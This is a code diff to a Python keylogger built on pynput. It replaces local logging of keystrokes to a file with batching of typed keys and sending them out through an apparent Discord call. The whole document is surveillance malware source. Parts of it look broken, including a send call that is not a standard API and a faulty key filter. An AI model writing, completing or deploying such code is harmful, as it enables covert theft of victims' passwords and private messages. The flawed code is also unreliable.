@@ -1,14 +1,37 @@
-from pynput.keyboard import Listener
-import logging
+from pynput.keyboard import Key, Listener
+import discord
 
-log_dir = r"COLOQUE O CAMINHO PARA A PASTA KEYLLOGER"
-logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+count = 0
+keys = []
 
 def on_press(key):
-    logging.info(str(key))
+    print(key, end= " ")
+    print("pressed")
+    global keys, count
+    keys.append(str(key))
+    count += 1
+    if count > 10:
+        count = 0
+        sendDiscord(keys)
 
-with Listener(on_press=on_press) as listener:
+def sendDiscord(keys):
+    msg = ""
+    for key in keys:
+        k = key.replace("'","\n")
+        if key == "Key.space":
+            k = " " 
+        elif key.find("Key")>0:
+            k = ""
+        msg += k
+    print(msg)
+    discord.send(msg)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
 
-
-
+    
